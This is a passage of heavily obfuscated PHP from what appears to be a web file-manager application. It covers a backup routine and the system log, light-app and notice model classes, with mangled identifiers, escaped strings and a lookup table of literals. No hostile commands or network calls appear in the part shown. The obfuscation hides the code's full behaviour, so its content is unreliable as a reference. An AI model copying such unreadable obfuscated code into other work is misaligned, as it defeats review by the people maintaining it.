Model($_SERVER[íû‘ş´][848])->where($‰«ĞÙßÚ)->field($Ÿ¼àı¡ã)->order($_SERVER[íû‘ş´][874])->selectPage($Î¯ôŸƒ , $§â‡Ò´·); $¾‰Ö«­Ô = !empty($É–Şá«²[$_SERVER[íû‘ş´][413]]) ? $É–Şá«²[$_SERVER[íû‘ş´][413]] : array(); foreach ($¾‰Ö«­Ô as $şµ¸Ù°Ë) { if (!$this->_fileExist($şµ¸Ù°Ë, $¬ÚÎæŒº, $¾§›§Ğİ)) { $×ÇÄæôô -= 1; $ßœ‡Úö -= (int) $şµ¸Ù°Ë[$_SERVER[íû‘ş´][76]]; write_log("\146\x69\154\145\x20\156\x6f\x74\40\145\x78\151\x73\164\56\146\151\x6c\145\111\104\72{$şµ¸Ù°Ë[$_SERVER[íû‘ş´][518]]}\54\x20\160\141\x74\150\72{$şµ¸Ù°Ë[$_SERVER[íû‘ş´][84]]}", $_SERVER[íû‘ş´][875]); continue; } $†ôÉ§Î = $şµ¸Ù°Ë[$_SERVER[íû‘ş´][84]]; $²‘ƒè”è = "\x7b\151\x6f\x3a{$ş£ôù¢ê[$_SERVER[íû‘ş´][810]]}\x7d" . substr($†ôÉ§Î, strlen("\173\x69\157\72{$şµ¸Ù°Ë[$_SERVER[íû‘ş´][876]]}\175")); if (IO::exist($²‘ƒè”è)) { $ø”ËŸäÜ->updateFileEnd($şµ¸Ù°Ë[$_SERVER[íû‘ş´][32]], $şµ¸Ù°Ë[$_SERVER[íû‘ş´][76]]); } else { $²‘ƒè”è = get_path_father($²‘ƒè”è); IO::mkdir($²‘ƒè”è); if (!IO::copy($†ôÉ§Î, $²‘ƒè”è, $_SERVER[íû‘ş´][877])) { write_log($_SERVER[íû‘ş´][878] . $†ôÉ§Î . $_SERVER[íû‘ş´][862] . $²‘ƒè”è . $_SERVER[íû‘ş´][165], $_SERVER[íû‘ş´][839]); $¼§…“©„ = !1; break; } } $†Æ¼Ğº = $şµ¸Ù°Ë[$_SERVER[íû‘ş´][518]]; $í´ëñ€ += 1; $Ë´£Ô += $şµ¸Ù°Ë[$_SERVER[íû‘ş´][76]]; $—‹„ı— += 1; $½ãäŠş += $şµ¸Ù°Ë[$_SERVER[íû‘ş´][76]]; if ($Ë´£Ô >= 1024 * 1024 * 100) { $ØÑ¯š¾ = array($_SERVER[íû‘ş´][879] => $†Æ¼Ğº, $_SERVER[íû‘ş´][880] => $—‹„ı—, $_SERVER[íû‘ş´][881] => $½ãäŠş); Backup::set($ØÑ¯š¾); $Ë´£Ô = $í´ëñ€ = 0; } } $×µ×Œô’ = count($¾‰Ö«­Ô); $§â‡Ò´·++; } while ($×µ×Œô’ == $Î¯ôŸƒ ); $ø”ËŸäÜ->end(); $ØÑ¯š¾ = array($_SERVER[íû‘ş´][882] => 1, $_SERVER[íû‘ş´][820] => time(), $_SERVER[íû‘ş´][834] => 1, $_SERVER[íû‘ş´][879] => $†Æ¼Ğº, $_SERVER[íû‘ş´][871] => $ßœ‡Úö, $_SERVER[íû‘ş´][870] => $×ÇÄæôô, $_SERVER[íû‘ş´][883] => time()); if ($í´ëñ€) { $ØÑ¯š¾[$_SERVER[íû‘ş´][880]] = $—‹„ı—; $ØÑ¯š¾[$_SERVER[íû‘ş´][881]] = $½ãäŠş; } Backup::set($ØÑ¯š¾); $this->_fileFilter($¬ÚÎæŒº); return !0; } private function _fileExist($×ó±Ó¹¢, &$ã…Œ“Ä¡, $ÏÀåæºæ) { $øÌ§Œóë =& $_SERVER[íû‘ş´]; $¦Ş¢®¥ = $×ó±Ó¹¢[$øÌ§Œóë[84]]; if (in_array($×ó±Ó¹¢[$øÌ§Œóë[518]], $ã…Œ“Ä¡)) { return !1; } if (!in_array($×ó±Ó¹¢[$øÌ§Œóë[876]], $ÏÀåæºæ)) { return !1; } if (IO::exist($¦Ş¢®¥)) { return !0; } $Âù¾Š‘â = get_path_father($¦Ş¢®¥); if (IO::exist($Âù¾Š‘â)) { $ã…Œ“Ä¡[] = $×ó±Ó¹¢[$øÌ§Œóë[518]]; return !1; } $‰ŸÚù = array($øÌ§Œóë[876] => $×ó±Ó¹¢[$øÌ§Œóë[876]], $øÌ§Œóë[84] => array($øÌ§Œóë[427], "{$Âù¾Š‘â}\x25")); $Üñ¢­ìõ = Model($øÌ§Œóë[848])->where($‰ŸÚù)->field($øÌ§Œóë[519])->select(); $ã…Œ“Ä¡ = array_merge($ã…Œ“Ä¡, array_to_keyvalue($Üñ¢­ìõ, $øÌ§Œóë[12], $øÌ§Œóë[518])); return !1; } private function _fileFilter($ùî±¨›Ö) { $æµ‚Í¦õ =& $_SERVER[íû‘ş´]; if (empty($ùî±¨›Ö)) { return; } $©†¹×¶ = array($æµ‚Í¦õ[518] => array($æµ‚Í¦õ[7], array_unique($ùî±¨›Ö))); $õÉ€Ç¿ø = Model($æµ‚Í¦õ[884])->where($©†¹×¶)->field($æµ‚Í¦õ[181])->select(); foreach ($õÉ€Ç¿ø as $¯Âš¹§™) { Model($æµ‚Í¦õ[884])->remove($¯Âš¹§™[$æµ‚Í¦õ[181]], !1); } } private function storeIds() { $ÊŸ±í¡¶ =& $_SERVER[íû‘ş´]; $šñ·œì® = Model($ÊŸ±í¡¶[826])->listData(); $á£ñ¦Ÿù = array(); $é†öÆ¥á = $GLOBALS[$ÊŸ±í¡¶[6]][$ÊŸ±í¡¶[89]][$ÊŸ±í¡¶[885]]; foreach ($šñ·œì® as $›€©×ƒ½) { $µ°£°Ø = strtolower($›€©×ƒ½[$ÊŸ±í¡¶[95]]); if (!isset($é†öÆ¥á[$µ°£°Ø])) { continue; } $»ä±ÓÇ» = $ÊŸ±í¡¶[74] . (isset($é†öÆ¥á[$µ°£°Ø]) ? $é†öÆ¥á[$µ°£°Ø] : ucfirst($µ°£°Ø)); if (!class_exists($»ä±ÓÇ»)) { continue; } $á£ñ¦Ÿù[] = $›€©×ƒ½[$ÊŸ±í¡¶[443]]; } return $á£ñ¦Ÿù; } } goto EÍ¥¡§ŸÓ¿; Fà‹‰«İ†Š: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\x2e\x4c\x69\x67\150\x74\x41\160\160"; public $modelType = "\x53\171\x73\164\x65\x6d\x4f\160\x74\x69\157\x6e"; public $field = array("\156\141\155\145", "\147\162\x6f\x75\160", "\144\x65\x73\143", "\x63\157\x6e\x74\x65\156\x74"); public function listData($ê¯˜¹§’ = false, $£ëÆÈ‰ = "\x6d\157\144\151\146\171\x54\x69\155\x65", $ğ¾æÊ”Ş = true) { return parent::listData($ê¯˜¹§’, $£ëÆÈ‰, $ğ¾æÊ”Ş); } public function remove($äïïïôô) { $Ë›’ôÏ² = $this->findByName($äïïïôô); if (!$Ë›’ôÏ²) { return !1; } return parent::remove($Ë›’ôÏ²[$_SERVER[íû‘ş´][443]]); } public function add($†òô¡“) { if ($this->findByName($†òô¡“[$_SERVER[íû‘ş´][32]])) { return !1; } return parent::insert($†òô¡“); } public function update($œşËó›Ÿ, $îâ¤¿»¥) { $×Æ£ş±ş =& $_SERVER[íû‘ş´]; $³¼àÇ” = $this->findByName($œşËó›Ÿ); $¹‚ó = $this->findByName($îâ¤¿»¥[$×Æ£ş±ş[32]]); if (!$³¼àÇ” || $¹‚ó && $¹‚ó[$×Æ£ş±ş[443]] != $³¼àÇ”[$×Æ£ş±ş[443]]) { return !1; } return parent::update($³¼àÇ”[$×Æ£ş±ş[443]], $îâ¤¿»¥); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\x73\164\x65\x6d\137\x6c\x6f\x67"; protected $dataAuto = array(array("\143\x72\145\141\164\x65\124\151\155\x65", "\164\x69\155\x65", "\151\156\163\x65\x72\164", "\146\x75\156\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $×ıã—ô¾ =& $_SERVER[íû‘ş´]; return array($×ıã—ô¾[2239] => LNG($×ıã—ô¾[2240]), $×ıã—ô¾[2241] => LNG($×ıã—ô¾[2242]), $×ıã—ô¾[1846] => LNG($×ıã—ô¾[2243]), $×ıã—ô¾[2244] => LNG($×ıã—ô¾[2245]), $×ıã—ô¾[2246] => LNG($×ıã—ô¾[2247]), $×ıã—ô¾[2248] => LNG($×ıã—ô¾[2249]), $×ıã—ô¾[2250] => LNG($×ıã—ô¾[2251]), $×ıã—ô¾[1876] => LNG($×ıã—ô¾[2251]), $×ıã—ô¾[1877] => LNG($×ıã—ô¾[2252]), $×ıã—ô¾[2253] => LNG($×ıã—ô¾[2254]), $×ıã—ô¾[2255] => LNG($×ıã—ô¾[2256]), $×ıã—ô¾[2257] => LNG($×ıã—ô¾[2258]), $×ıã—ô¾[2259] => LNG($×ıã—ô¾[2260]), $×ıã—ô¾[1874] => LNG($×ıã—ô¾[2261]), $×ıã—ô¾[2262] => LNG($×ıã—ô¾[2263]), $×ıã—ô¾[1881] => LNG($×ıã—ô¾[2264]), $×ıã—ô¾[2265] => LNG($×ıã—ô¾[2266]), $×ıã—ô¾[2267] => LNG($×ıã—ô¾[2268]), $×ıã—ô¾[2269] => LNG($×ıã—ô¾[2270]), $×ıã—ô¾[2271] => LNG($×ıã—ô¾[2272]), $×ıã—ô¾[1884] => LNG($×ıã—ô¾[2273]), $×ıã—ô¾[1885] => LNG($×ıã—ô¾[2274]), $×ıã—ô¾[2275] => LNG($×ıã—ô¾[2276]), $×ıã—ô¾[2277] => LNG($×ıã—ô¾[2278]), $×ıã—ô¾[2279] => LNG($×ıã—ô¾[2280]), $×ıã—ô¾[1879] => LNG($×ıã—ô¾[2281]), $×ıã—ô¾[2282] => LNG($×ıã—ô¾[2283]), $×ıã—ô¾[1878] => LNG($×ıã—ô¾[2284]), $×ıã—ô¾[2285] => LNG($×ıã—ô¾[2286]), $×ıã—ô¾[2287] => LNG($×ıã—ô¾[2288]), $×ıã—ô¾[2289] => LNG($×ıã—ô¾[2290]), $×ıã—ô¾[2291] => LNG($×ıã—ô¾[2291]), $×ıã—ô¾[2292] => LNG($×ıã—ô¾[1850]), $×ıã—ô¾[2293] => LNG($×ıã—ô¾[2294]), $×ıã—ô¾[2295] => LNG($×ıã—ô¾[2296]), $×ıã—ô¾[2297] => LNG($×ıã—ô¾[2298]), $×ıã—ô¾[2299] => LNG($×ıã—ô¾[2300]), $×ıã—ô¾[2301] => LNG($×ıã—ô¾[2302]), $×ıã—ô¾[2303] => LNG($×ıã—ô¾[2303]), $×ıã—ô¾[2304] => LNG($×ıã—ô¾[2305]), $×ıã—ô¾[2306] => LNG($×ıã—ô¾[2307]), $×ıã—ô¾[2308] => LNG($×ıã—ô¾[2309]), $×ıã—ô¾[2310] => LNG($×ıã—ô¾[2311]), $×ıã—ô¾[2312] => LNG($×ıã—ô¾[2313]), $×ıã—ô¾[2314] => LNG($×ıã—ô¾[2315])); } private function typeFile() { $ÆÅØı¼¬ =& $_SERVER[íû‘ş´]; $ˆÎ„»¬› = array($ÆÅØı¼¬[1881] => array($ÆÅØı¼¬[1882]), $ÆÅØı¼¬[2257] => array($ÆÅØı¼¬[2316]), $ÆÅØı¼¬[2259] => array($ÆÅØı¼¬[2317]), $ÆÅØı¼¬[1874] => array($ÆÅØı¼¬[1875], $ÆÅØı¼¬[2318]), $ÆÅØı¼¬[2267] => array(), $ÆÅØı¼¬[2269] => array(), $ÆÅØı¼¬[2271] => array(), $ÆÅØı¼¬[1884] => array($ÆÅØı¼¬[1886]), $ÆÅØı¼¬[1885] => array($ÆÅØı¼¬[1886]), $ÆÅØı¼¬[2275] => array($ÆÅØı¼¬[2319]), $ÆÅØı¼¬[2277] => array($ÆÅØı¼¬[2319]), $ÆÅØı¼¬[2279] => array($ÆÅØı¼¬[2320]), $ÆÅØı¼¬[2265] => array($ÆÅØı¼¬[2321]), $ÆÅØı¼¬[1879] => array($ÆÅØı¼¬[2322]), $ÆÅØı¼¬[2282] => array($ÆÅØı¼¬[2323]), $ÆÅØı¼¬[1878] => array($ÆÅØı¼¬[1880])); return $ˆÎ„»¬›; } private function typeAll() { $™î¦³ò =& $_SERVER[íû‘ş´]; $Ïà±ëÄÅ = $this->typeList; $£ÖùÅÀ§ = array_filter($this->typeFile()); foreach ($£ÖùÅÀ§ as $ã¨ºÜ¾ˆ => $—ÍµÇ‘) { $Ïà±ëÄÅ[$—ÍµÇ‘[0]] = $Ïà±ëÄÅ[$ã¨ºÜ¾ˆ]; } $Ïà±ëÄÅ[$™î¦³ò[1886]] = LNG($™î¦³ò[2324]); $Ïà±ëÄÅ[$™î¦³ò[2319]] = LNG($™î¦³ò[2325]); return $Ïà±ëÄÅ; } public function addLog($×’²¦Æ¡, $¢¦Ã¼–Î = array()) { $±È±‰¶È =& $_SERVER[íû‘ş´]; if (!isset($this->typeList[$×’²¦Æ¡])) { return; } $İÅ–ˆÒ“ = isset($¢¦Ã¼–Î[$±È±‰¶È[1705]]) ? $¢¦Ã¼–Î[$±È±‰¶È[1705]] : 0; if (!$İÅ–ˆÒ“) { $İÅ–ˆÒ“ = Session::get($±È±‰¶È[2040]); } if ($×’²¦Æ¡ == $±È±‰¶È[2293] && is_array($¢¦Ã¼–Î[$±È±‰¶È[2326]]) && !$¢¦Ã¼–Î[$±È±‰¶È[2326]]) { return; } $¤ÜşÉ— = get_client_ip(); if (!$¢¦Ã¼–Î || strlen(json_encode($¢¦Ã¼–Î)) >= 1024) { $¢¦Ã¼–Î = array($±È±‰¶È[2327] => $¤ÜşÉ—); } else { if (is_array($¢¦Ã¼–Î)) { $¢¦Ã¼–Î[$±È±‰¶È[2327]] = $¤ÜşÉ—; } else { $¢¦Ã¼–Î = array($±È±‰¶È[1260] => $¢¦Ã¼–Î, $±È±‰¶È[2327] => $¤ÜşÉ—); } } $¢¦Ã¼–Î = array($±È±‰¶È[1695] => Session::sign(), $±È±‰¶È[1696] => intval($İÅ–ˆÒ“), $±È±‰¶È[33] => $×’²¦Æ¡, $±È±‰¶È[1698] => json_encode($¢¦Ã¼–Î)); parent::add($¢¦Ã¼–Î); } public function remove($»ÍÒ”Úú) { $this->where(array($_SERVER[íû‘ş´][470] => $»ÍÒ”Úú))->delete(); } private function _makeOrder($¿ìØ´ë’ = '') { $‰ı±¾Óı =& $_SERVER[íû‘ş´]; $¨ åĞİ… = $‰ı±¾Óı[215]; $´¹ÈğÕ = array($‰ı±¾Óı[500] => $‰ı±¾Óı[501], $‰ı±¾Óı[502] => $‰ı±¾Óı[503]); $Åëğ‰øç = Input::get($‰ı±¾Óı[508], $‰ı±¾Óı[7], $‰ı±¾Óı[2076], array($‰ı±¾Óı[1994], $‰ı±¾Óı[502])); $Åëğ‰øç = $´¹ÈğÕ[$Åëğ‰øç]; $¿ìØ´ë’ = $¿ìØ´ë’ . "{$¨ åĞİ…}\x20{$Åëğ‰øç}"; return $this->order($¿ìØ´ë’); } public function get($°è˜½¸ö = '') { $ş÷µÑê =& $_SERVER[íû‘ş´]; if (!$°è˜½¸ö) { show_json(array()); } $Èß–Ù€ = array(); if ($°è˜½¸ö[$ş÷µÑê[1705]]) { $Èß–Ù€[$ş÷µÑê[1705]] = $°è˜½¸ö[$ş÷µÑê[1705]]; } if (isset($°è˜½¸ö[$ş÷µÑê[819]])) { $±§«´½¯ = $°è˜½¸ö[$ş÷µÑê[819]]; $Ù¤öÄ´ = isset($°è˜½¸ö[$ş÷µÑê[820]]) ? $°è˜½¸ö[$ş÷µÑê[820]] : time(); $Èß–Ù€[$ş÷µÑê[215]] = array($ş÷µÑê[377], array($±§«´½¯, $Ù¤öÄ´)); } if ($°è˜½¸ö[$ş÷µÑê[33]]) { $•Ä­¹»å = explode($ş÷µÑê[50], $°è˜½¸ö[$ş÷µÑê[33]]); $–ˆÉ Ë = $this->typeFile(); $êì˜µª = array(); foreach ($•Ä­¹»å as $£Âûú•) { $êì˜µª[] = $£Âûú•; if (isset($–ˆÉ Ë[$£Âûú•])) { $êì˜µª = array_merge($êì˜µª, $–ˆÉ Ë[$£Âûú•]); } } $êì˜µª = array_unique($êì˜µª); if ($êì˜µª) { $Èß–Ù€[$ş÷µÑê[33]] = array($ş÷µÑê[7], $êì˜µª); } } else { $Èß–Ù€[$ş÷µÑê[33]] = array($ş÷µÑê[2328], $ş÷µÑê[2329]); } if (!empty($°è˜½¸ö[$ş÷µÑê[2327]])) { $Èß–Ù€[$ş÷µÑê[503]] = array($ş÷µÑê[427], "\x25{$°è˜½¸ö[$ş÷µÑê[2327]]}\45"); } $šÎÀ™Øñ = $this->_makeOrder()->where($Èß–Ù€)->selectPage(); if (empty($šÎÀ™Øñ[$ş÷µÑê[413]])) { show_json(array(), !0, $šÎÀ™Øñ[$ş÷µÑê[410]]); } $šÎÀ™Øñ[$ş÷µÑê[413]] = $this->logList($šÎÀ™Øñ[$ş÷µÑê[413]]); return $šÎÀ™Øñ; } private function ipAddress(&$ÔøçİöÓ) { $±“õåÆ =& $_SERVER[íû‘ş´]; if (!empty($ÔøçİöÓ[$±“õåÆ[2327]])) { $½ÕÛÍÇş = IpLocation::get($ÔøçİöÓ[$±“õåÆ[2327]]); } else { $½ÕÛÍÇş = LNG($±“õåÆ[2330]); } $ÔøçİöÓ[$±“õåÆ[2331]] = $½ÕÛÍÇş; } private function descZipDownload($¡ö¬©½Ê, &$ßÔ‚Ï¾) { $õĞŠç¯Æ =& $_SERVER[íû‘ş´]; if (!isset($¡ö¬©½Ê[$õĞŠç¯Æ[2332]])) { return; } $ÅÈæ‚“‰ = json_decode($¡ö¬©½Ê[$õĞŠç¯Æ[2332]], !0); foreach ($ÅÈæ‚“‰ as $É½ÂŸÊ†) { try { $ÜÊ“Ùíî = IO::infoFullSimple($É½ÂŸÊ†[$õĞŠç¯Æ[84]]); } catch (Exception $àÖ½ª»¡) { continue; } $¡ö¬©½Ê[$õĞŠç¯Æ[84]] = $É½ÂŸÊ†[$õĞŠç¯Æ[84]]; $ßÔ‚Ï¾[] = $¡ö¬©½Ê[$õĞŠç¯Æ[181]] = $ÜÊ“Ùíî[$õĞŠç¯Æ[181]]; $ßÔ‚Ï¾[] = $¡ö¬©½Ê[$õĞŠç¯Æ[2131]] = $ÜÊ“Ùíî[$õĞŠç¯Æ[180]]; break; } return $¡ö¬©½Ê; } private function getSourceList(&$¿‡¼äë‡) { $®İ³³¤¦ =& $_SERVER[íû‘ş´]; $º¸ğõùâ = array(); foreach ($¿‡¼äë‡ as $”®·¡•§ => $ëçøû¨û) { $©”±÷¤› = json_decode($ëçøû¨û[$®İ³³¤¦[503]], !0); if ($ëçøû¨û[$®İ³³¤¦[33]] == $®İ³³¤¦[1877]) { $©”±÷¤› = $this->descZipDownload($©”±÷¤›, $º¸ğõùâ); $¿‡¼äë‡[$”®·¡•§][$®İ³³¤¦[503]] = json_encode($©”±÷¤›); continue; } if (strpos($ëçøû¨û[$®İ³³¤¦[33]], $®İ³³¤¦[2133]) !== 0) { if (!isset($©”±÷¤›[$®İ³³¤¦[84]]) || strpos($ëçøû¨û[$®İ³³¤¦[33]], $®İ³³¤¦[2333]) !== 0) { continue; } try { $±ë¨™¼ = IO::infoFullSimple($©”±÷¤›[$®İ³³¤¦[84]]); } catch (Exception $ú¤í‡œ) { continue; } $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[181]] = $±ë¨™¼[$®İ³³¤¦[181]]; $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[2131]] = $±ë¨™¼[$®İ³³¤¦[180]]; $¿‡¼äë‡[$”®·¡•§][$®İ³³¤¦[503]] = json_encode($©”±÷¤›); continue; } $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[181]]; $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[2131]]; if ($©”±÷¤›[$®İ³³¤¦[33]] == $®İ³³¤¦[598]) { $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[503]][$®İ³³¤¦[1218]]; $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[503]][$®İ³³¤¦[1219]]; } if ($©”±÷¤›[$®İ³³¤¦[33]] == $®İ³³¤¦[2141]) { $º¸ğõùâ[] = $©”±÷¤›[$®İ³³¤¦[503]][$®İ³³¤¦[181]]; } } if (!$º¸ğõùâ) { return array(); } return Model($®İ³³¤¦[884])->sourceListInfo($º¸ğõùâ, !0); } private function logList($½ÚÒˆ¡Ï) { $×À¾²İª =& $_SERVER[íû‘ş´]; $ˆÏºà = array_to_keyvalue($½ÚÒˆ¡Ï, $×À¾²İª[12], $×À¾²İª[1705]); $¢¨ÊªÔ˜ = Model($×À¾²İª[577])->userListInfo(array_unique($ˆÏºà)); $¢ÏÚçŒÙ = $this->getSourceList($½ÚÒˆ¡Ï); $¨¹æ·Ê§ = $this->typeAll(); $ÂòïÎ‘‡ = array(); $Èü„ç = array(); foreach ($½ÚÒˆ¡Ï as $îü±ıÔ => $ğ¯Œ§£) { $åÍ´ë§ = $ğ¯Œ§£[$×À¾²İª[33]]; $ù´Ûµš“ = isset($¢¨ÊªÔ˜[$ğ¯Œ§£[$×À¾²İª[1705]]]) ? $¢¨ÊªÔ˜[$ğ¯Œ§£[$×À¾²İª[1705]]] : !1; $¹¹ñ•ÅÏ = strpos($åÍ´ë§, $×À¾²İª[2334]) === 0 ? LNG($×À¾²İª[2335]) : LNG($×À¾²İª[2330]); $ğ¯Œ§£[$×À¾²İª[32]] = isset($ù´Ûµš“[$×À¾²İª[32]]) ? $ù´Ûµš“[$×À¾²İª[32]] : LNG($×À¾²İª[2330]); $ğ¯Œ§£[$×À¾²İª[2185]] = isset($ù´Ûµš“[$×À¾²İª[2185]]) ? $ù´Ûµš“[$×À¾²İª[2185]] : $×À¾²İª[12]; $ğ¯Œ§£[$×À¾²İª[1599]] = isset($¨¹æ·Ê§[$åÍ´ë§]) ? $¨¹æ·Ê§[$åÍ´ë§] : $¹¹ñ•ÅÏ; $ğ¯Œ§£[$×À¾²İª[2075]] = $ù´Ûµš“; $ŸÊêÜ‰ = json_decode($ğ¯Œ§£[$×À¾²İª[503]], !0); $ğ¯Œ§£[$×À¾²İª[2327]] = isset($ŸÊêÜ‰[$×À¾²İª[2327]]) ? $ŸÊêÜ‰[$×À¾²İª[2327]] : $×À¾²İª[12]; $ğ¯Œ§£[$×À¾²İª[2331]] = IpLocation::get($ğ¯Œ§£[$×À¾²İª[2327]]); if (strpos($åÍ´ë§, $×À¾²İª[2133]) === 0 || isset($ŸÊêÜ‰[$×À¾²İª[2131]])) { $ŸÊêÜ‰[$×À¾²İª[87]] = $¢ÏÚçŒÙ[$ŸÊêÜ‰[$×À¾²İª[181]]]; $ŸÊêÜ‰[$×À¾²İª[2146]] = $¢ÏÚçŒÙ[$ŸÊêÜ‰[$×À¾²İª[2131]]]; if ($ŸÊêÜ‰[$×À¾²İª[33]] == $×À¾²İª[598]) { $ŸÊêÜ‰[$×À¾²İª[503]][$×À¾²İª[1218]] = $¢ÏÚçŒÙ[$ŸÊêÜ‰[$×À¾²İª[503]][$×À¾²İª[1218]]]; $ŸÊêÜ‰[$×À¾²İª[503]][$×À¾²İª[1219]] = $¢ÏÚçŒÙ[$ŸÊêÜ‰[$×À¾²İª[503]][$×À¾²İª[1219]]]; } if ($ŸÊêÜ‰[$×À¾²İª[33]] == $×À¾²İª[2141]) { $ŸÊêÜ‰[$×À¾²İª[503]][$×À¾²İª[181]] = $¢ÏÚçŒÙ[$ŸÊêÜ‰[$×À¾²İª[503]][$×À¾²İª[181]]]; } if ($ŸÊêÜ‰[$×À¾²İª[33]] == $×À¾²İª[1872]) { $ŸÊêÜ‰[$×À¾²İª[2146]] = $ŸÊêÜ‰[$×À¾²İª[87]]; $ŸÊêÜ‰[$×À¾²İª[2131]] = $ŸÊêÜ‰[$×À¾²İª[2146]][$×À¾²İª[181]]; $ŸÊêÜ‰[$×À¾²İª[87]] = !1; $ŸÊêÜ‰[$×À¾²İª[181]] = $×À¾²İª[12]; } if ($ŸÊêÜ‰[$×À¾²İª[87]] && $ŸÊêÜ‰[$×À¾²İª[87]][$×À¾²İª[178]] == $×À¾²İª[179]) { $Èü„ç[] = $ğ¯Œ§£[$×À¾²İª[443]]; unset($½ÚÒˆ¡Ï[$îü±ıÔ]); continue; } if ($ŸÊêÜ‰[$×À¾²İª[2146]] && $ŸÊêÜ‰[$×À¾²İª[2146]][$×À¾²İª[178]] == $×À¾²İª[179]) { $Èü„ç[] = $ğ¯Œ§£[$×À¾²İª[443]]; unset($½ÚÒˆ¡Ï[$îü±ıÔ]); continue; } } $ğ¯Œ§£[$×À¾²İª[503]] = $ŸÊêÜ‰; unset($ğ¯Œ§£[$×À¾²İª[2336]]); $ÂòïÎ‘‡[] = $ğ¯Œ§£; } $this->clearSystemPathLog($Èü„ç); return $ÂòïÎ‘‡; } private function clearSystemPathLog($î†ÄÙ¶) { $¤í»Ø =& $_SERVER[íû‘ş´]; if (count($î†ÄÙ¶) == 0) { return; } $º¹šåŞÔ = array($¤í»Ø[443] => array($¤í»Ø[7], array_unique($î†ÄÙ¶))); $this->where($º¹šåŞÔ)->delete(); } public function deviceList($¡‘ˆÃÒ, $ç…ù¾§è = 0) { $¢”ã‰¹ =& $_SERVER[íû‘ş´]; $áóÏ•ğ = array($¢”ã‰¹[1705] => $¡‘ˆÃÒ, $¢”ã‰¹[215] => array($¢”ã‰¹[1072], $ç…ù¾§è), $¢”ã‰¹[33] => $¢”ã‰¹[1846]); $ä‰ì‚º… = array(); $Ô¿ĞŒ¿š = $this->field($¢”ã‰¹[2337])->where($áóÏ•ğ)->order($¢”ã‰¹[2144])->limit(50)->select(); foreach ($Ô¿ĞŒ¿š as $ûªŠ‹½Å => $¨ØÈ§ûÅ) { if ($ûªŠ‹½Å > 0 && abs($¨ØÈ§ûÅ[$¢”ã‰¹[215]] - $Ô¿ĞŒ¿š[$ûªŠ‹½Å - 1][$¢”ã‰¹[215]]) < 5) { continue; } $Öà„©‚ù = json_decode($¨ØÈ§ûÅ[$¢”ã‰¹[503]], !0); $¨ØÈ§ûÅ[$¢”ã‰¹[2327]] = isset($Öà„©‚ù[$¢”ã‰¹[2327]]) ? $Öà„©‚ù[$¢”ã‰¹[2327]] : $¢”ã‰¹[12]; unset($Öà„©‚ù[$¢”ã‰¹[2327]]); $ˆå±ğÛğ = $this->deviceType($Öà„©‚ù[$¢”ã‰¹[2134]]); if (isset($ä‰ì‚º…[$ˆå±ğÛğ])) { continue; } $¨ØÈ§ûÅ[$¢”ã‰¹[2331]] = IpLocation::get($¨ØÈ§ûÅ[$¢”ã‰¹[2327]]); $¨ØÈ§ûÅ[$¢”ã‰¹[503]] = $Öà„©‚ù; $ä‰ì‚º…[$ˆå±ğÛğ] = $¨ØÈ§ûÅ; } return array_values($ä‰ì‚º…); } public function deviceType($Ã¾Œ°î—) { return $Ã¾Œ°î—; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\x2e\156\x6f\164\151\143\145\114\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\143\x6f\x6e\x74\145\156\164", "\x61\165\x74\150", "\x6d\157\x64\x65", "\164\x69\155\x65", "\x74\x79\x70\x65", "\x6c\x65\x76\x65\154", "\145\156\x61\142\154\145", "\x73\x6f\x72\164"); public function listData($‹–·â‹ = false, $€Îë‹¤ã = "\163\157\162\x74", $ÕÛÑš÷ = false) { return parent::listData($‹–·â‹, $€Îë‹¤ã, $ÕÛÑš÷); } public function add($Ü‘âï) { $Ñ¶šÎ™‘ =& $_SERVER[íû‘ş´]; $Öª®’À· = time(); if ($Ü‘âï[$Ñ¶šÎ™‘[16]] == $Ñ¶šÎ™‘[2338]) { $Öª®’À· = strtotime($Ü‘âï[$Ñ¶šÎ™‘[194]]); } $Ü‘âï[$Ñ¶šÎ™‘[194]] = $Öª®’À·; return parent::insert($Ü‘âï); } public function update($ş®éÒüƒ, $¯õŒÏç») { $ë®İùØù =& $_SERVER[íû‘ş´]; $‹æƒº÷ã = $this->listData($ş®éÒüƒ); if (!$‹æƒº÷ã) { return !1; } $ï°ûã­Æ = time(); if ($¯õŒÏç»[$ë®İùØù[16]] == $ë®İùØù[2338]) { $ï°ûã­Æ = strtotime($¯õŒÏç»[$ë®İùØù[194]]); } $¯õŒÏç»[$ë®İùØù[194]] = $ï°ûã­Æ; return parent::update($ş®éÒüƒ, $¯õŒÏç»); } public function remove($ÇÄğİ) { $™»ïÔÌÈ = $this->listData($ÇÄğİ); if (!$™»ïÔÌÈ || $™»ïÔÌÈ[$_SERVER[íû‘ş´][179]]) { return !1; } return parent::remove($ÇÄğİ); } public function sort($öá¶®ôª, $¬…£æˆ) { return parent::update($öá¶®ôª, $¬…£æˆ); } public function enable($ñÔÓã–Ô, $œÌŒœª¬) { return parent::update($ñÔÓã–Ô, array($_SERVER[íû‘ş´][2339] => $œÌŒœª¬)); } private function initUserOption() { $½  ÙüĞ =& $_SERVER[íû‘ş´]; $this->optionType = $½  ÙüĞ[2340]; $this->modelType = $½  ÙüĞ[2341]; $this->field = array($½  ÙüĞ[2342], $½  ÙüĞ[32], $½  ÙüĞ[194], $½  ÙüĞ[33], $½  ÙüĞ[2343], $½  ÙüĞ[809], $½  ÙüĞ[210]); } public function userNoticeGet($ËñçºìÂ = false) { $this->initUserOption(); return parent::listData($ËñçºìÂ, $_SERVER[íû‘ş´][443], !0); } public function userNoticeAdd($ó””­¶) { $Ú»ÀÓŸ‘ =& $_SERVER[íû‘ş´]; $this->initUserOption(); $æ¹‰·€â = $this->findByKey($Ú»ÀÓŸ‘[2342], $ó””­¶[$Ú»ÀÓŸ‘[443]]); if ($æ¹‰·€â) { return !0; } $¤ÖÔÂ®“ = array($Ú»ÀÓŸ‘[2342] => 